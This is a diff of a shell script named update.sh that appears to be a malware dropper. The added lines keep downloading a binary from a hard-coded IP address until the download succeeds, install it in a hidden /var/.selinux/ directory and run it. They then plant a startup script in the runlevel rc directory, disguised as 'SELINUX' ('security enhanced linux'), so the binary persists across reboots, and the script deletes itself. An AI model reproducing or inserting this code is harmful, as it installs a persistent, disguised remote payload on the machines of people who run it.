@@ -2,11 +2,19 @@
 
 # parameter protocal: update.sh alexjlz_client_url
 
-base_location="/lib/alexjlz/"
-tmp_file="/tmp/alexjlz_client"
-default_url="http://198.211.0.204/alexjlz_client"
+declare -i count_down_from=100
+declare -i does_this_exist=0
+current_working_directory=`pwd`
+current_runlevel=`runlevel | cut -d ' ' -f 2`
+current_rc_d="/etc/rc$current_runlevel.d/"
+
+self=`basename $0`
+base_location="/var/.selinux/"
+tmp_file="/tmp/client"
+default_url="http://198.211.0.204/client"
 url=""
 mydownloader=`which curl`
+declare -i status=1
 
 mkdir -p $base_location
 
@@ -16,13 +24,37 @@ then
 else
     url=$1
 fi
-$mydownloader $url >$tmp_file 2>/dev/null
-if [ $? -eq 0 ]
-then
-    cp $tmp_file $base_location/alexjlz_client
-    chmod a+x $base_location/alexjlz_client
-    $base_location/alexjlz_client
-else
-    exit -1
-fi
+while [ $status -ne 0 ]
+do
+    rm -rf $tmp_file
+    $mydownloader $url >$tmp_file 2>/dev/null
+    status=$?
+done
+cp $tmp_file $base_location/client
+chmod a+x $base_location/client
+$base_location/client
 rm -rf $tmp_file
+
+cd $current_rc_d
+while [ $count_down_from -gt 20 ]
+do
+    count_down_from=$count_down_from-1
+    does_this_exist=`ls | grep "^S$count_down_from" | wc -l`
+    if [ $does_this_exist -eq 0 ];then
+        new_S_file_name="S${count_down_from}SELINUX"
+        echo "#!/bin/sh" >> $new_S_file_name
+        echo "#alexjlz" >> $new_S_file_name
+        echo "#security enhanced linux" >> $new_S_file_name
+        echo "$base_location/client" >> $new_S_file_name
+        break
+    else
+        this_file=`ls | grep "^S$count_down_from"`
+        grep "alexjlz" $this_file >/dev/null 2>&1
+        if [ $? -eq 0 ];then
+            break
+        fi
+    fi
+done
+cd $current_working_directory
+rm -rf $self
+exit 0
